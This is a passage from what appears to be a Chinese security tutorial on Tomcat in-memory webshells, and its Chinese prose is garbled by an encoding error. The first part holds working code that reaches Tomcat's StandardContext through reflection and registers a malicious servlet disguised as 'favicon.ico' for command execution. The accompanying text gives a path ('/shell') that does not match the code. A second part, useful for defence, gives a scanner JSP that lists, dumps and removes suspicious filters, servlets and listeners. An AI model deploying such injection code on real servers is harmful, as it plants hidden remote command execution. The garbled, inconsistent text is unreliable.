è·å–å½“å‰çš„StandardContext ä»¥ä¸‹æ–¹å¼å¤±æ•ˆ  // org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =  // (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  // StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();  // Tomcatå…¨ç‰ˆæœ¬ä¸‹è·å–StandardContextå¯¹è±¡  class Tomcat6789 { String uri; String serverName; StandardContext standardContext; public Object getField(Object object, String fieldName) { Field declaredField; Class clazz = object.getClass(); while (clazz != Object.class) { try { declaredField = clazz.getDeclaredField(fieldName); declaredField.setAccessible(true); return declaredField.get(object); } catch (NoSuchFieldException e){} catch (IllegalAccessException e){} clazz = clazz.getSuperclass(); } return null; } public Tomcat6789() { Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), \u0026#34;threads\u0026#34;); Object object; for (Thread thread : threads) { if (thread == null) { continue; } if (thread.getName().contains(\u0026#34;exec\u0026#34;)) { continue; } Object target = this.getField(thread, \u0026#34;target\u0026#34;); if (!(target instanceof Runnable)) { continue; } try { object = getField(getField(getField(target, \u0026#34;this$0\u0026#34;), \u0026#34;handler\u0026#34;), \u0026#34;global\u0026#34;); } catch (Exception e) { continue; } if (object == null) { continue; } java.util.ArrayList processors = (java.util.ArrayList) getField(object, \u0026#34;processors\u0026#34;); Iterator iterator = processors.iterator(); while (iterator.hasNext()) { Object next = iterator.next(); Object req = getField(next, \u0026#34;req\u0026#34;); Object serverPort = getField(req, \u0026#34;serverPort\u0026#34;); if (serverPort.equals(-1)){continue;} org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, \u0026#34;serverNameMB\u0026#34;); this.serverName = (String) getField(serverNameMB, \u0026#34;strValue\u0026#34;); if (this.serverName == null){ this.serverName = serverNameMB.toString(); } if (this.serverName == null){ this.serverName = serverNameMB.getString(); } org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, \u0026#34;uriMB\u0026#34;); this.uri = (String) getField(uriMB, \u0026#34;strValue\u0026#34;); if (this.uri == null){ this.uri = uriMB.toString(); } if (this.uri == null){ this.uri = uriMB.getString(); } this.getStandardContext(); return; } } } public void getStandardContext() { Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), \u0026#34;threads\u0026#34;); for (Thread thread : threads) { if (thread == null) { continue; } if ((thread.getName().contains(\u0026#34;Acceptor\u0026#34;)) \u0026amp;\u0026amp; (thread.getName().contains(\u0026#34;http\u0026#34;))) { Object target = this.getField(thread, \u0026#34;target\u0026#34;); HashMap children; Object jioEndPoint = null; try { jioEndPoint = getField(target, \u0026#34;this$0\u0026#34;); }catch (Exception e){} if (jioEndPoint == null){ try{ jioEndPoint = getField(target, \u0026#34;endpoint\u0026#34;); }catch (Exception e){ return; } } Object service = getField(getField(getField(getField(getField(jioEndPoint, \u0026#34;handler\u0026#34;), \u0026#34;proto\u0026#34;), \u0026#34;adapter\u0026#34;), \u0026#34;connector\u0026#34;), \u0026#34;service\u0026#34;); StandardEngine engine = null; try { engine = (StandardEngine) getField(service, \u0026#34;container\u0026#34;); }catch (Exception e){} if (engine == null){ engine = (StandardEngine) getField(service, \u0026#34;engine\u0026#34;); } children = (HashMap) getField(engine, \u0026#34;children\u0026#34;); StandardHost standardHost = (StandardHost) children.get(this.serverName); children = (HashMap) getField(standardHost, \u0026#34;children\u0026#34;); Iterator iterator = children.keySet().iterator(); while (iterator.hasNext()){ String contextKey = (String) iterator.next(); if (!(this.uri.startsWith(contextKey))){continue;} StandardContext standardContext = (StandardContext) children.get(contextKey); this.standardContext = standardContext; return; } } } } public StandardContext getSTC(){ return this.standardContext; } } Tomcat6789 a = new Tomcat6789(); StandardContext standardCtx = a.getSTC(); %\u0026gt;   å°†æ¶æ„servletå°è£…æˆwrapperæ·»åŠ åˆ°StandardContextçš„childrenå½“ä¸­ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  \u0026lt;% // ç”¨Wrapperå¯¹å…¶è¿›è¡Œå°è£…  org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper(); newWrapper.setName(\u0026#34;favicon.ico\u0026#34;); newWrapper.setLoadOnStartup(1); newWrapper.setServlet(servlet); newWrapper.setServletClass(servlet.getClass().getName()); // æ·»åŠ å°è£…åçš„æ¶æ„Wrapperåˆ°StandardContextçš„childrenä¸­  standardCtx.addChild(newWrapper); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   æ·»åŠ ServletMappingå°†è®¿é—®çš„URLå’Œwrapperè¿›è¡Œç»‘å®š 1 2 3 4 5 6 7  \u0026lt;% // æ·»åŠ ServletMappingåˆ°å°†è®¿é—®çš„URLå’ŒServletè¿›è¡Œç»‘å®š  standardCtx.addServletMappingDecoded(\u0026#34;/favicon.ico\u0026#34;,\u0026#34;favicon.ico\u0026#34;); %\u0026gt;   æ‰§è¡Œä¸Šè¿°ä»£ç åï¼Œè®¿é—®å½“å‰åº”ç”¨çš„/shellè·¯å¾„ï¼ŒåŠ ä¸Šcmdå‚æ•°å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ã€‚\nå†…å­˜é©¬æ£€æµ‹ä¸æ’æŸ¥ æºç æ£€æµ‹ åœ¨Javaä¸­ï¼Œåªæœ‰è¢«JVMåŠ è½½/æˆ–åœ¨éœ€è¦æ—¶é€šè¿‡åå°„é€šçŸ¥JVMåŠ è½½çš„ç±»æ‰èƒ½è¢«è°ƒç”¨ã€‚æ‰€æœ‰çš„ç‰¹å¾éƒ½åœ¨å†…å­˜ä¸­ï¼Œè¡¨ç°å½¢å¼ä¸ºè¢«åŠ è½½çš„classï¼Œéœ€è¦é€šè¿‡æŸç§æ–¹æ³•è·å–åˆ°JVMè¿è¡Œæ—¶å†…å­˜ä¸­å·²åŠ è½½çš„ç±»ã€‚\nJavaæœ¬èº«æä¾›äº†Instrumentationç±»æ¥å®ç°\nå®ç°æ€è·¯ï¼š\n æ³¨å…¥jaråŒ… \u0026ndash;\u0026gt;dumpå·²åŠ è½½classå­—èŠ‚ç  \u0026ndash;\u0026gt; åç¼–è¯‘æˆjavaä»£ç  \u0026ndash;\u0026gt; æºç webshellæ£€æµ‹\n æ£€æµ‹åˆ¤å®šï¼š\n æ–°å¢æˆ–ä¿®æ”¹çš„ç±» æ²¡æœ‰å¯¹åº”classæ–‡ä»¶çš„ç±» xmlé…ç½®ä¸­æ²¡æœ‰æ³¨å†Œçš„ å†°èç­‰å¸¸è§å·¥å…·ä½¿ç”¨çš„ç±» filterchainä¸­æ’ç¬¬ä¸€çš„filterç±»  æœ‰ä¸€äº›å·¥å…·å¯ä»¥è¾…åŠ©æ£€æµ‹å†…å­˜é©¬ï¼Œå¦‚java-memshell-scanneræ˜¯é€šè¿‡jspæ‰«æåº”ç”¨ä¸­æ‰€æœ‰çš„filterå’Œservletï¼Œç„¶åé€šè¿‡åç§°ã€å¯¹åº”çš„classæ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å†…å­˜é©¬ã€‚\nå†…å­˜é©¬æ£€æµ‹java-memshell-scanner åˆ›å»ºmemshell-scanner.jsp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376  \u0026lt;%-- Created by IntelliJ IDEA. User: ding.fugui Date: 7/20/22 Time: 14:35 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.net.URL\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.HashMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;com.sun.org.apache.bcel.internal.Repository\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.net.URLEncoder\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Map\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardWrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Method\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.ArrayList\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.List\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.concurrent.CopyOnWriteArrayList\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;tomcat-memshell-killer\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%! public Object getStandardContext(HttpServletRequest request) throws NoSuchFieldException, IllegalAccessException { Object context = request.getSession().getServletContext(); Field _context = context.getClass().getDeclaredField(\u0026#34;context\u0026#34;); _context.setAccessible(true); Object appContext = _context.get(context); Field __context = appContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); __context.setAccessible(true); Object standardContext = __context.get(appContext); return standardContext; } public HashMap\u0026lt;String, Object\u0026gt; getFilterConfig(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _filterConfigs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); _filterConfigs.setAccessible(true); HashMap\u0026lt;String, Object\u0026gt; filterConfigs = (HashMap\u0026lt;String, Object\u0026gt;) _filterConfigs.get(standardContext); return filterConfigs; } // FilterMap[]  public Object[] getFilterMaps(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _filterMaps = standardContext.getClass().getDeclaredField(\u0026#34;filterMaps\u0026#34;); _filterMaps.setAccessible(true); Object filterMaps = _filterMaps.get(standardContext); Object[] filterArray = null; try { // tomcat 789  Field _array = filterMaps.getClass().getDeclaredField(\u0026#34;array\u0026#34;); _array.setAccessible(true); filterArray = (Object[]) _array.get(filterMaps); } catch (Exception e) { // tomcat 6  filterArray = (Object[]) filterMaps; } return filterArray; } /** * é—ç•™é—®é¢˜,getFilterConfig()ä¾ç„¶å­˜åœ¨2ä¸ª * @param request * @param filterName * @throws Exception */ public synchronized void deleteFilter(HttpServletRequest request, String filterName) throws Exception { Object standardContext = getStandardContext(request); // org.apache.catalina.core.StandardContext#removeFilterDef  HashMap\u0026lt;String, Object\u0026gt; filterConfig = getFilterConfig(request); Object appFilterConfig = filterConfig.get(filterName); Field _filterDef = appFilterConfig.getClass().getDeclaredField(\u0026#34;filterDef\u0026#34;); _filterDef.setAccessible(true); Object filterDef = _filterDef.get(appFilterConfig); Class clsFilterDef = null; try { // Tomcat 8  clsFilterDef = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34;); } catch (Exception e) { // Tomcat 7  clsFilterDef = Class.forName(\u0026#34;org.apache.catalina.deploy.FilterDef\u0026#34;); } Method removeFilterDef = standardContext.getClass().getDeclaredMethod(\u0026#34;removeFilterDef\u0026#34;, new Class[]{clsFilterDef}); removeFilterDef.setAccessible(true); removeFilterDef.invoke(standardContext, filterDef); // org.apache.catalina.core.StandardContext#removeFilterMap  Class clsFilterMap = null; try { // Tomcat 8  clsFilterMap = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34;); } catch (Exception e) { // Tomcat 7  clsFilterMap = Class.forName(\u0026#34;org.apache.catalina.deploy.FilterMap\u0026#34;); } Object[] filterMaps = getFilterMaps(request); for (Object filterMap : filterMaps) { Field _filterName = filterMap.getClass().getDeclaredField(\u0026#34;filterName\u0026#34;); _filterName.setAccessible(true); String filterName0 = (String) _filterName.get(filterMap); if (filterName0.equals(filterName)) { Method removeFilterMap = standardContext.getClass().getDeclaredMethod(\u0026#34;removeFilterMap\u0026#34;, new Class[]{clsFilterMap}); removeFilterDef.setAccessible(true); removeFilterMap.invoke(standardContext, filterMap); } } } public synchronized void deleteServlet(HttpServletRequest request, String servletName) throws Exception { HashMap\u0026lt;String, Object\u0026gt; childs = getChildren(request); Object objChild = childs.get(servletName); String urlPattern = null; HashMap\u0026lt;String, String\u0026gt; servletMaps = getServletMaps(request); for (Map.Entry\u0026lt;String, String\u0026gt; servletMap : servletMaps.entrySet()) { if (servletMap.getValue().equals(servletName)) { urlPattern = servletMap.getKey(); break; } } if (urlPattern != null) { // åå°„è°ƒç”¨ org.apache.catalina.core.StandardContext#removeServletMapping  Object standardContext = getStandardContext(request); Method removeServletMapping = standardContext.getClass().getDeclaredMethod(\u0026#34;removeServletMapping\u0026#34;, new Class[]{String.class}); removeServletMapping.setAccessible(true); removeServletMapping.invoke(standardContext, urlPattern); // Tomcat 6å¿…é¡»removeChild 789å¯ä»¥ä¸ç”¨  // åå°„è°ƒç”¨ org.apache.catalina.core.StandardContext#removeChild  Method removeChild = standardContext.getClass().getDeclaredMethod(\u0026#34;removeChild\u0026#34;, new Class[]{org.apache.catalina.Container.class}); removeChild.setAccessible(true); removeChild.invoke(standardContext, objChild); } } public synchronized HashMap\u0026lt;String, Object\u0026gt; getChildren(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _children = standardContext.getClass().getSuperclass().getDeclaredField(\u0026#34;children\u0026#34;); _children.setAccessible(true); HashMap\u0026lt;String, Object\u0026gt; children = (HashMap\u0026lt;String, Object\u0026gt;) _children.get(standardContext); return children; } public synchronized HashMap\u0026lt;String, String\u0026gt; getServletMaps(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _servletMappings = standardContext.getClass().getDeclaredField(\u0026#34;servletMappings\u0026#34;); _servletMappings.setAccessible(true); HashMap\u0026lt;String, String\u0026gt; servletMappings = (HashMap\u0026lt;String, String\u0026gt;) _servletMappings.get(standardContext); return servletMappings; } public synchronized List\u0026lt;Object\u0026gt; getListenerList(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _listenersList = standardContext.getClass().getDeclaredField(\u0026#34;applicationEventListenersList\u0026#34;); _listenersList.setAccessible(true); List\u0026lt;Object\u0026gt; listenerList = (CopyOnWriteArrayList) _listenersList.get(standardContext); return listenerList; } public String getFilterName(Object filterMap) throws Exception { Method getFilterName = filterMap.getClass().getDeclaredMethod(\u0026#34;getFilterName\u0026#34;); getFilterName.setAccessible(true); return (String) getFilterName.invoke(filterMap, null); } public String[] getURLPatterns(Object filterMap) throws Exception { Method getFilterName = filterMap.getClass().getDeclaredMethod(\u0026#34;getURLPatterns\u0026#34;); getFilterName.setAccessible(true); return (String[]) getFilterName.invoke(filterMap, null); } String classFileIsExists(Class clazz) { if (clazz == null) { return \u0026#34;class is null\u0026#34;; } String className = clazz.getName(); String classNamePath = className.replace(\u0026#34;.\u0026#34;, \u0026#34;/\u0026#34;) + \u0026#34;.class\u0026#34;; URL is = clazz.getClassLoader().getResource(classNamePath); if (is == null) { return \u0026#34;åœ¨ç£ç›˜ä¸Šæ²¡æœ‰å¯¹åº”classæ–‡ä»¶ï¼Œå¯èƒ½æ˜¯å†…å­˜é©¬\u0026#34;; } else { return is.getPath(); } } String arrayToString(String[] str) { String res = \u0026#34;[\u0026#34;; for (String s : str) { res += String.format(\u0026#34;%s,\u0026#34;, s); } res = res.substring(0, res.length() - 1); res += \u0026#34;]\u0026#34;; return res; } %\u0026gt; \u0026lt;% out.write(\u0026#34;\u0026lt;h2\u0026gt;Tomcat memshell scanner 0.1.0\u0026lt;/h2\u0026gt;\u0026#34;); String action = request.getParameter(\u0026#34;action\u0026#34;); String filterName = request.getParameter(\u0026#34;filterName\u0026#34;); String servletName = request.getParameter(\u0026#34;servletName\u0026#34;); String className = request.getParameter(\u0026#34;className\u0026#34;); if (action != null \u0026amp;\u0026amp; action.equals(\u0026#34;kill\u0026#34;) \u0026amp;\u0026amp; filterName != null) { deleteFilter(request, filterName); } else if (action != null \u0026amp;\u0026amp; action.equals(\u0026#34;kill\u0026#34;) \u0026amp;\u0026amp; servletName != null) { deleteServlet(request, servletName); } else if (action != null \u0026amp;\u0026amp; action.equals(\u0026#34;dump\u0026#34;) \u0026amp;\u0026amp; className != null) { byte[] classBytes = Repository.lookupClass(Class.forName(className)).getBytes(); response.addHeader(\u0026#34;content-Type\u0026#34;, \u0026#34;application/octet-stream\u0026#34;); String filename = Class.forName(className).getSimpleName() + \u0026#34;.class\u0026#34;; String agent = request.getHeader(\u0026#34;User-Agent\u0026#34;); if (agent.toLowerCase().indexOf(\u0026#34;chrome\u0026#34;) \u0026gt; 0) { response.addHeader(\u0026#34;content-Disposition\u0026#34;, \u0026#34;attachment;filename=\u0026#34; + new String(filename.getBytes(\u0026#34;UTF-8\u0026#34;), \u0026#34;ISO8859-1\u0026#34;)); } else { response.addHeader(\u0026#34;content-Disposition\u0026#34;, \u0026#34;attachment;filename=\u0026#34; + URLEncoder.encode(filename, \u0026#34;UTF-8\u0026#34;)); } ServletOutputStream outDumper = response.getOutputStream(); outDumper.write(classBytes, 0, classBytes.length); outDumper.close(); } else { // Scan filter  out.write(\u0026#34;\u0026lt;h4\u0026gt;Filter scan result\u0026lt;/h4\u0026gt;\u0026#34;); out.write(\u0026#34;\u0026lt;table border=\\\u0026#34;1\\\u0026#34; cellspacing=\\\u0026#34;0\\\u0026#34; width=\\\u0026#34;95%\\\u0026#34; style=\\\u0026#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;ID\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Filter name\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Patern\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Filter class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Filter classLoader\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;25%\\\u0026#34;\u0026gt;Filter class file path\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;dump class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;kill\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;tbody\u0026gt;\u0026#34;); HashMap\u0026lt;String, Object\u0026gt; filterConfigs = getFilterConfig(request); Object[] filterMaps1 = getFilterMaps(request); for (int i = 0; i \u0026lt; filterMaps1.length; i++) { out.write(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;); Object fm = filterMaps1[i]; Object appFilterConfig = filterConfigs.get(getFilterName(fm)); if (appFilterConfig == null) { continue; } Field _filter = appFilterConfig.getClass().getDeclaredField(\u0026#34;filter\u0026#34;); _filter.setAccessible(true); Object filter = _filter.get(appFilterConfig); String filterClassName = filter.getClass().getName(); String filterClassLoaderName = filter.getClass().getClassLoader().getClass().getName(); // ID Filtername åŒ¹é…è·¯å¾„ className classLoader æ˜¯å¦å­˜åœ¨file dump kill  out.write(String.format(\u0026#34;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;%d\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=dump\u0026amp;className=%s\\\u0026#34;\u0026gt;dump\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=kill\u0026amp;filterName=%s\\\u0026#34;\u0026gt;kill\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#34; , i + 1 , getFilterName(fm) , arrayToString(getURLPatterns(fm)) , filterClassName , filterClassLoaderName , classFileIsExists(filter.getClass()) , filterClassName , getFilterName(fm))); out.write(\u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;); } out.write(\u0026#34;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026#34;); // Scan servlet  out.write(\u0026#34;\u0026lt;h4\u0026gt;Servlet scan result\u0026lt;/h4\u0026gt;\u0026#34;); out.write(\u0026#34;\u0026lt;table border=\\\u0026#34;1\\\u0026#34; cellspacing=\\\u0026#34;0\\\u0026#34; width=\\\u0026#34;95%\\\u0026#34; style=\\\u0026#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;ID\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Servlet name\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;10%\\\u0026#34;\u0026gt;Patern\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Servlet class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Servlet classLoader\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;25%\\\u0026#34;\u0026gt;Servlet class file path\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;dump class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;kill\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;tbody\u0026gt;\u0026#34;); HashMap\u0026lt;String, Object\u0026gt; children = getChildren(request); Map\u0026lt;String, String\u0026gt; servletMappings = getServletMaps(request); int servletId = 0; for (Map.Entry\u0026lt;String, String\u0026gt; map : servletMappings.entrySet()) { String servletMapPath = map.getKey(); String servletName1 = map.getValue(); StandardWrapper wrapper = (StandardWrapper) children.get(servletName1); Class servletClass = null; try { servletClass = Class.forName(wrapper.getServletClass()); } catch (Exception e) { Object servlet = wrapper.getServlet(); if (servlet != null) { servletClass = servlet.getClass(); } } if (servletClass != null) { out.write(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;); String servletClassName = servletClass.getName(); String servletClassLoaderName = null; try { servletClassLoaderName = servletClass.getClassLoader().getClass().getName(); } catch (Exception e) { } out.write(String.format(\u0026#34;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;%d\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=dump\u0026amp;className=%s\\\u0026#34;\u0026gt;dump\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=kill\u0026amp;servletName=%s\\\u0026#34;\u0026gt;kill\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#34; , servletId + 1 , servletName1 , servletMapPath , servletClassName , servletClassLoaderName , classFileIsExists(servletClass) , servletClassName , servletName1)); out.write(\u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;); } servletId++; } out.write(\u0026#34;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026#34;); List\u0026lt;Object\u0026gt; listeners = getListenerList(request); if (listeners == null || listeners.size() == 0) { return; } out.write(\u0026#34;\u0026lt;tbody\u0026gt;\u0026#34;); List\u0026lt;ServletRequestListener\u0026gt; newListeners = new ArrayList\u0026lt;\u0026gt;(); for (Object o : listeners) { if (o instanceof ServletRequestListener) { newListeners.add((ServletRequestListener) o); } } // Scan listener  out.write(\u0026#34;\u0026lt;h4\u0026gt;Listener scan result\u0026lt;/h4\u0026gt;\u0026#34;); out.write(\u0026#34;\u0026lt;table border=\\\u0026#34;1\\\u0026#34; cellspacing=\\\u0026#34;0\\\u0026#34; width=\\\u0026#34;95%\\\u0026#34; style=\\\u0026#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;ID\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;20%\\\u0026#34;\u0026gt;Listener class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;30%\\\u0026#34;\u0026gt;Listener classLoader\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;35%\\\u0026#34;\u0026gt;Listener class file path\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;dump class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;kill\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;tbody\u0026gt;\u0026#34;); int index = 0; for (ServletRequestListener listener : newListeners) { out.write(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;); out.write(String.format(\u0026#34;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;%d\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=dump\u0026amp;className=%s\\\u0026#34;\u0026gt;dump\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=kill\u0026amp;servletName=%s\\\u0026#34;\u0026gt;kill\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#34; , index + 1 , listener.getClass().getName() , listener.getClass().getClassLoader() , classFileIsExists(listener.getClass()) , listener.getClass().getName() , listener.getClass().getName())); out.write(\u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;); index++; } out.write(\u0026#34;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026#34;); } %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br/\u0026gt; 